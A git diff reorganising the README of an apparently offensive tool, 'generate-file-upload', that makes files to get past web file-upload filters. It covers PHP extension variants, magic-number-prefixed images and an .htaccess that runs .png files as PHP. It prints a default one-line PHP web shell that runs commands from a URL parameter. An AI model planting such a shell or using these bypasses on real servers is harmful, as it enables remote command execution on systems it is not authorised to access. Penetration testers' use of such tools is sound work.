@@ -1,10 +1,56 @@
 # generate-file-upload
 Generate some payload to bypass restriction when you perform a file upload
 
-```
-python upfile.py
-```
 Generate in `Payloads/` all extension for PHP
+
+## Installation & Usage
+
+```
+git clone https://github.com/LighTend3r/generate-file-upload.git
+cd ./generate-file-upload
+```
+To install it, write the command above
+
+```
+python3 upfile.py -h
+```
+If you want help to understand the programme
+
+-----
+
+## Exemple of usage :
+```
+python3 upfile.py
+```
+Generate all extension in PHP
+
+
+```
+python3 upfile.py -b
+```
+Generate all bypass for PHP
+
+
+```
+python3 upfile.py -n test -p test -ext php
+```
+Generate file named `test.php` which contain `test`
+
+
+```
+python3 upfile.py -b -m png
+```
+Generate all files bypass for PHP, which contain `magicNumber + payload`
+
+
+```
+python3 upfile.py -ext png -ht png
+```
+Generate `.htaccess` which allow execution of php with extension .png and create `paylaod.png`
+
+-----
+
+## Options
 
 Default name : `payload`
 
@@ -12,35 +58,6 @@ Default file : `PHP`
 
 Default payload : `<?php system($_GET["cmd"]); ?>`
 
------
-
-## Exemple of usage :
-```
-python upfile.py -b
-```
-Generate all bypass for PHP
-
-
-```
-python upfile.py -n test -p test -ext php
-```
-Generate file named `test.php` which contain `test`
-
-
-```
-python upfile.py -b -m png
-```
-Generate all files bypass for PHP, which contain `magicNumber + payload`
-
-
-```
-python upfile.py -ext png -ht png
-```
-Generate `.htaccess` which allow execution of php with extension .png and create `paylaod.png`
-
------
-
-## Options
 ```
 usage: upfile.py [-h] [-d] [-p <payload>] [-f {php}] [-ext <ext>] [-b] [-n <name>] [-m {png,jpg}] [-ht <ext>]
 
@@ -63,4 +80,4 @@ options:
   -ht <ext>, --htaccess <ext>
                         Creates in addition a .htaccess file, which allow execution of php whith extension that you
                         have chosen
-   ```                     
+   ```         
